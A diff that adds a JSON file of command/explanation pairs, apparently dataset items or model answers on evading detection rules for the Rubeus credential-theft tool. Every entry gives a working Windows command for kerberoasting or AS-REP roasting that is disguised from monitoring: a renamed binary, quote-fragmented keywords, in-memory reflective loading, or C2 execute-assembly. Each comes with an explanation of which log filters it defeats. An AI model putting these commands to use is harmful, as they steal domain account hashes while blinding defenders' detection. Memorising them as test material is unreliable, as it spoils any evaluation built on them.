@@ -1,0 +1,26 @@
+[
+  {
+    "output": "copy C:\\Tools\\Rubeus.exe C:\\Windows\\Temp\\not_malware.exe",
+    "explanation": "The first step to bypass image-based detection (Image|endswith and OriginalFileName) is to rename the binary and change its metadata if possible. This bypasses the rules looking for 'Rubeus.exe' specifically."
+  },
+  {
+    "output": "C:\\Windows\\Temp\\not_malware.exe kerb\"\"eroast /ou\"\"tputfile:pass.txt",
+    "explanation": "Bypassing CommandLine 'contains' filters can often be achieved by using command-line obfuscation. In Windows, inserting empty double quotes (\"\") within a command string is ignored by the command processor but prevents simple pattern matching from identifying the keyword 'kerberoast'."
+  },
+  {
+    "output": "$r = [System.Reflection.Assembly]::Load((Get-Content 'Rubeus.exe' -Encoding Byte)); [Rubeus.Program]::Main('kerberoast'.Split())",
+    "explanation": "Reflective loading in memory (fileless execution) via PowerShell or a custom loader completely bypasses process creation logs that rely on Image names, OriginalFileName, or Description, as the 'Rubeus' process is never technically 'created' as a standalone file on disk."
+  },
+  {
+    "output": "C:\\Windows\\Temp\\not_malware.exe asr\"\"eproast /user:admin /fo\"\"rmat:hashcat",
+    "explanation": "Similar to the kerberoast example, this uses string fragmentation to break the 'asreproast ' (with trailing space) signature while maintaining the functional integrity of the command for the Rubeus parser."
+  },
+  {
+    "output": "copy C:\\Tools\\Rubeus.exe C:\\Windows\\Temp\\not_malware.exe && C:\\Windows\\Temp\\not_malware.exe \"kerb\"\"eroast\" /outfile:C:\\Windows\\Temp\\hashes.txt",
+    "explanation": "The rule is bypassed by changing the file metadata and obfuscating the command line. By renaming the executable to 'not_malware.exe', we avoid the 'Image', 'OriginalFileName', and 'Description' filters (assuming the Description metadata is stripped or modified). By using string concatenation/quotes in the command line (e.g., \"kerb\"\"eroast\"), we evade simple string-based 'CommandLine|contains' detection for the keyword 'kerberoast '."
+  },
+  {
+    "output": "Execute-Assembly -DotNetShell Rubeus.exe \"asreproast /format:hashcat\"",
+    "explanation": "Using a C2 framework's 'execute-assembly' functionality allows Rubeus to run entirely in memory within a surrogate process (like a spawned notepad.exe). This bypasses the rule because no process named Rubeus.exe is ever created on disk, and the malicious arguments are often passed via an encrypted channel or spoofed, avoiding the process creation event log and the specific CommandLine filters."
+  }
+]
